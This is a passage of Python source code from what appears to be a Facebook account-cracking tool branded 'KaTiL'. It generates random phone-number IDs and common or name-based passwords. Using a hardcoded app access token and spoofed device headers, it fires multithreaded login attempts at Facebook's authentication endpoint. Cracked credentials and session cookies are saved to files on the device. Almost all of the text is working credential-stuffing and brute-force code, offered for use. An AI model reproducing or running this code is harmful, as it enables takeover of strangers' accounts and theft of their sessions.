                for nmbr in range(limit):
                        nmp = "".join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as TRT:     
                        clear()
                        
                        tl = str(len(user))
                        print("[+] Total accounts: \033[1;97m"+tl)
                        print("[+] Select code: \033[1;97m "+code)
                        print("[+] Process has been started \033[1;97m")
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,"khankhan","malik123","kingkhan","baloch123","pak123","khan123"]
                                TRT.submit(rndm,ids,passlist)
                print("\033[1;37m")
                linex()
                print(" THE PROCESS HAS COMPLETED")
                print(" TOTAL OK/CP: "+str(len(oks))+"/"+str(len(cps)))
                linex()
                input(" PRESS ENTER TO BACK ")
                os.system("python trt.py")
#------
def ffb(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write("\r\r\033[1;37m [KaTiL-RUNING] %s|\033[1;37mOK:-%s \033[1;37m"%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(" ")[0]
                try:
                        ln = names.split(" ")[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace("first",fn.lower()).replace("First",fn).replace("last",ln.lower()).replace("Last",ln).replace("Name",names).replace("name",names.lower())
                        accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                        fbav = f"{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}"
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device["android_version"]
                        model = device["model"]
                        build = device["build"]
                        fblc = device["fblc"]
                        fbcr = sim_id
                        fbmf = device["fbmf"]
                        fbbd = device["fbbd"]
                        fbdv = device["fbdv"]
                        fbsv = device["fbsv"]
                        fbca = device["fbca"]
                        fbdm = device["fbdm"]
                        fbfw = "1"
                        fbrv = "0"
                        fban = "FB4A"
                        fbpn = "com.facebook.katana"
                        en = random.choice(["en_US","en_GB","pk_PK"])
                        cph = random.choice(["CPH1979","CPH1983","CPH1987","CPH2005","CPH2009","CPH2015","CPH2059","CPH2061","CPH2065","CPH2069","CPH2071","CPH2073","CPH2077","CPH2091","CPH2095","CPH2099","CPH2137","CPH2139","CPH2145","CPH2161","CPH2185","CPH2201","CPH2209","CPH1801","CPH1803","CPH1805","CPH1809","CPH1827","CPH1837","CPH1851","CPH1853"])
                        network = random.choice(["Zong","null","Marshmallow","Telekom China"])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+".0.0."+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/*{density=4.0,width=1440,eight=2560};FBLC/en_US;FBCR/3.;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G925F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi:;]"
                        random_seed = random.Random()
                        adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                        xd =str("".join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ["28","29","210"]
                        li2 = random.choice(li)
                        j1 = "".join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-KaTiL"}
                        url = "https://b-graph.facebook.com/auth/login"
                        twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
                        po = requests.post(url,data=data,headers=headers).json()
                        if "session_key" in po:
                                        print("\r\r\033[1;32m [LEGEND-KaTiL-OK] "+ids+" | "+pas+"\033[1;97m")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open("/sdcard/KaTiL-COOKIE.txt","a").write(ids+"|"+pas+ " | " +coki+"\n")
                                        open("/sdcard/KaTiL-OK.txt","a").write(ids+"|"+pas+"\n")
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if "y" in pcp:
                                                print("\r\r \033[1;34m[KaTiL-2F] "+ids+" | "+pas)
                                                twf.append(ids)
                                                break
                        elif "www.facebook.com" in po["error"]["message"]:
                                        if "y" in pcp:
                                                print("\r\r\x1b[1;31m [ALONE-KaTiL-CP] "+ids+" | "+pas+"\033[1;97m")
                                                open("/sdcard/KaTiL-CP.txt","a").write(ids+"|"+pas+"\n")
                                                break
                                                cps.append(ids)
                                        else:
                                                open("/sdcard/KaTiL-CP.txt","a").write(ids+"|"+pas+"\n")
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write("\r\r\033[1;37m [KaTiL-RUNING ] %s|\033[1;37mOK:-%s \033[1;37m"%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(" ")[0]
                try:
                        ln = names.split(" ")[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace("first",fn.lower()).replace("First",fn).replace("last",ln.lower()).replace("Last",ln).replace("Name",names).replace("name",names.lower())
                        accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                        fbav = f"{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}"
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device["android_version"]
                        model = device["model"]
                        build = device["build"]
                        fblc = device["fblc"]
                        fbcr = sim_id
                        fbmf = device["fbmf"]
                        fbbd = device["fbbd"]
                        fbdv = device["fbdv"]
                        fbsv = device["fbsv"]
                        fbca = device["fbca"]
                        fbdm = device["fbdm"]
                        fbfw = "1"
                        fbrv = "0"
                        fban = "FB4A"
                        fbpn = "com.facebook.katana"
                        inform = random.choice(["X697""X663", "X663B","PR652B","X267","X5010","X521","X5514D","X5515","X5515F","X559","X559C","X559F","X571","X572","X573","X573B","X601","X603","X604","X604B","X605","X606","X606B","X606C","X606D","X608","X609","X610","X610B","X612","X612B","X620","X620B","X622","X623","X623B","X624","X624B","X625","X625B","X625D","X626","X626B","X627V","X650","X650B","X650C","X650D","X652","X652A","X652B","X652C","X653","X653C","X655","X655C","X655D","X655F","X656","X657","X657B","X657C","X659B","X660","X660B","X660C","X680","X680B","X680C","X682B","X682C","X683","X687","X687B","X688B","X688C","X688C","X689","X689B","X689C","X690","X690B","X692","X693","X695","X695C"])
                        ams = str(random.randint(111,555))+".0.0."+str(random.randrange(9,49))+str(random.randint(111,555))
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+".0.0."+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/*{density=4.0,width=1440,eight=2560};FBLC/en_US;FBCR/3.;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G925F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi:;]"
                        random_seed = random.Random()
                        adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                        xd =str("".join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ["28","29","210"]
                        li2 = random.choice(li)
                        j1 = "".join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={
                                "User-Agent": ua,
"Content-Type": "application/x-www-form-urlencoded",
"Host": "graph.facebook.com",
"X-FB-Net-HNI": "25227",
"X-FB-SIM-HNI": "29752",
"X-FB-Connection-Type": "MOBILE.LTE",
"X-Tigon-Is-Retry": "False",
"x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
"x-fb-device-group": "5120",
"X-FB-Friendly-Name": "ViewerReactionsMutation",
"X-FB-Request-Analytics-Tags": "graphservice",
"X-FB-HTTP-Engine": "Liger",
"X-FB-Client-IP": "True",
"X-FB-Server-Cluster": "True",
"x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
"Content-Length": "706"}
                        url = "https://b-graph.facebook.com/auth/login"
                        twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
                        po = requests.post(url,data=data,headers=headers).json()
                        if "session_key" in po:
                                        print("\r\r\033[1;32m [LEGEND-KaTiL-OK] "+ids+" | "+pas+"\033[1;97m")
                                        open("/sdcard/KaTiL-OK.txt","a").write(ids+"|"+pas+"\n")
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if "y" in pcp:
                                                print("\r\r \033[1;34m[KaTiL-2F] "+ids+" | "+pas)
                                                twf.append(ids)
                                                break
                        elif "www.facebook.com" in po["error"]["message"]:
                                        if "y" in pcp:
                                                print("\r\r\x1b[1;31m [ALONE-KaTiL-CP] "+ids+" | "+pas+"\033[1;97m")
                                                open("/sdcard/KaTiL-CP.txt","a").write(ids+"|"+pas+"\n")
                                                break
                                                cps.append(ids)
                                        else:
                                                open("/sdcard/KaTiL-CP.txt","a").write(ids+"|"+pas+"\n")
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass

def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write("\r\r\033[1;37m [KaTiL-RUNING] %s|\033[1;37mOK:-%s \033[1;37m"%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                        fbav = f"{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}"
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device["android_version"]
                        model = device["model"]
                        build = device["build"]
                        fblc = device["fblc"]
                        fbcr = sim_id
                        fbmf = device["fbmf"]
                        fbbd = device["fbbd"]
                        fbdv = device["fbdv"]
                        fbsv = device["fbsv"]
                        fbca = device["fbca"]
                        fbdm = device["fbdm"]
                        fbfw = "1"
                        fbrv = "0"
                        fban = "FB4A"
                        fbpn = "com.facebook.katana"
                        en = random.choice(["en_US","en_GB"])
                        cph = random.choice(["CPH1979","CPH1983","CPH1987","CPH2005","CPH2009","CPH2015","CPH2059","CPH2061","CPH2065","CPH2069","CPH2071","CPH2073","CPH2077","CPH2091","CPH2095","CPH2099","CPH2137","CPH2139","CPH2145","CPH2161","CPH2185","CPH2201","CPH2209","CPH1801","CPH1803","CPH1805","CPH1809","CPH1827","CPH1837","CPH1851","CPH1853"])
                        network = random.choice(["Zong","null","Marshmallow","Telekom China"])
                        ua  = str(usmi())
                       
                        random_seed = random.Random()
                        adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                        xd =str("".join(random_seed.choices(string.digits, k=20)))
                        sm=["GT-", "SM-"]
                        sim_serials = f'["{xd}"]'
                        li = ["28","29","210"]
                        li2 = random.choice(li)
                        j1 = "".join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid":adid,
                                "format":"json",
                                "device_id":device_id,
                                "email":ids,
                                "password":pas,
                                "generate_analytics_claims":"1",
                                "credentials_type":"password",
                                "source":"login",
                                "error_detail_type":"button_with_disabled",
                                "enroll_misauth":"false",
                                "generate_session_cookies":"1",
                                "generate_machine_id":"1",
                                "fb_api_req_friendly_name":"authenticate",
                        }
                        headers={
                                "Authorization":f"OAuth {accessToken}",
                                "X-FB-Friendly-Name":"authenticate",
                                "X-FB-Connection-Type":"unknown",
                                "User-Agent":ua,
                                "Accept-Encoding":"gzip, deflate",
                                "Content-Type": "application/x-www-form-urlencoded",
                                "X-FB-HTTP-Engine": "Liger"
                                }
                        url = "https://b-graph.facebook.com/auth/login"
                        twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
                        po = requests.post(url,data=data,headers=headers).json()
                        if "session_key" in po:
                                try:
                                        uid = po["uid"]
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print("\r\r\033[1;32m [LEGEND-KaTiL-OK] "+str(uid)+" | "+pas+"\033[1;97m")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        #open("/sdcard/trt-COKIE.txt","a").write(str(uid)+"|"+pas+ " | " +coki+"\n")
                                        open("/sdcard/KaTiL-rnd-OK.txt","a").write(str(uid)+"|"+pas+"\n")
                                        oks.append(str(uid))
                                        break
                        elif "www.facebook.com" in po["error"]["message"]:
                                try:
                                        uid = po["error"]["error_data"]["uid"]
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                    #    print("\r\r\x1b[1;31m [KaTiL-CP] "+str(uid)+" | "+pas+"\033[1;97m")
                                        open("/sdcard/KaTiL-rnd-CP.txt","a").write(str(uid)+"|"+pas+"\n")
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
                        
try:
        menu()
except requests.exceptions.ConnectionError:
        print("\n No internet connection ...")
        exit()
